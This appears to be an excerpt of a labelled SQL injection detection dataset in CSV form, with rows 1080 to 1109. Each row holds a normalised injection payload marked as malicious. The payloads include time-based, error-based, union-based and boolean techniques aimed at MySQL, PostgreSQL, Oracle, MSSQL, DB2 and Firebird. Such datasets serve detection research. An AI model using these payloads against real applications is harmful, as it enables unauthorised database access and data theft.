row_index,payload_norm,label,sqli_type_hint
1080,1 ) and ( select * from ( select ( sleep ( 5 ) ) ) fzno ),1,
1081,"1%"" ) ) and 8635 = ( select count ( * ) from generate_series ( 1,5000000 ) ) --",1,
1082,"1"" ) ) as rcse where 4559 = 4559 and extractvalue ( 7982,concat ( 0x5c,0x7171706a71, ( select ( elt ( 7982 = 7982,1 ) ) ) ,0x717a767a71 ) ) --",1,
1083,"1"" ) ) or exp ( ~ ( select * from ( select concat ( 0x7171706a71, ( select ( elt ( 6270 = 6270,1 ) ) ) ,0x717a767a71,0x78 ) ) x ) ) and ( ( ""oxvw"" = ""oxvw",1,
1084,-9840' ) ) or 4747 = dbms_utility.sqlid_to_sqlhash ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4747 = 4747 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) ) and ( ( 'dzlp' = 'dzlp,1,
1085,"1'|| ( select 'svbf' where 7017 = 7017 or elt ( 6272 = 6272,sleep ( 5 ) ) ) ||'",1,
1086,-4892%' ) ) or 2251 = 9881--,1,
1087,"1"" ) and 3707 = ( select count ( * ) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 ) and ( ""pfea"" = ""pfea",1,
1088,"-5859 ) as ernq where 8394 = 8394 union all select 8394,8394,8394--",1,
1089,"-4076' ) ) union all select 9030,9030,9030,9030,9030,9030,9030,9030,9030,9030--",1,
1090,-6233' ) where 9820 = 9820 or 3038 = 3038,1,
1091,"-8950"" ) ) as uahs where 2113 = 2113 union all select 2113,2113,2113,2113,2113,2113,2113,2113,2113,2113#",1,
1092,"-8209 ) or 1 group by concat ( 0x7171706a71, ( select ( case when ( 4232 = 4232 ) then 1 else 0 end ) ) ,0x717a767a71,floor ( rand ( 0 ) *2 ) ) having min ( 0 ) #",1,
1093,-9826 where 4103 = 4103 order by 1#,1,
1094,1 ) ) as muyz where 6105 = 6105,1,
1095,1' and 1541 = 6868#,1,
1096,1 ) where 1402 = 1402,1,
1097,1'|| ( select 'wadx' where 4287 = 4287 or sleep ( 5 ) #,1,
1098,"-3234%"" ) ) or elt ( 1032 = 1032,3623 ) and ( ( ""%"" = """,1,
1099,"1' union all select null,null,null--",1,
1100,1 where 9872 = 9872,1,
1101,"-7482%"" ) ) or 1570 = convert ( int, ( select char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select ( case when ( 1570 = 1570 ) then char ( 49 ) else char ( 48 ) end ) ) +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ) +char ( 113 ) ) ) and ( ( ""%"" = """,1,
1102,"1' ) where 7587 = 7587 or 8421 = ( select count ( * ) from generate_series ( 1,5000000 ) ) --",1,
1103,"-9295 ) ) ) or 1570 = convert ( int, ( select char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select ( case when ( 1570 = 1570 ) then char ( 49 ) else char ( 48 ) end ) ) +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ) +char ( 113 ) ) ) and ( ( ( 8752 = 8752",1,
1104,"1' ) as ibqr where 5372 = 5372 and 8312 = dbms_pipe.receive_message ( chr ( 69 ) ||chr ( 79 ) ||chr ( 101 ) ||chr ( 68 ) ,5 ) --",1,
1105,"-9135"" ) ) or 6872 = 6872 and ( ( ""fllx"" = ""fllx",1,
1106,1%' and 7756 = dbms_utility.sqlid_to_sqlhash ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 7756 = 7756 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) ) and '%' = ',1,
1107,"1%' or 7552 = ( select count ( * ) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 ) and '%' = '",1,
1108,"1, ( select ( case when ( 3888 = 3888 ) then ( select count ( * ) from generate_series ( 1,5000000 ) ) else 1/ ( select 0 ) end ) )",1,
1109,"-9881"" ) ) or 9850 = 8118#",1,
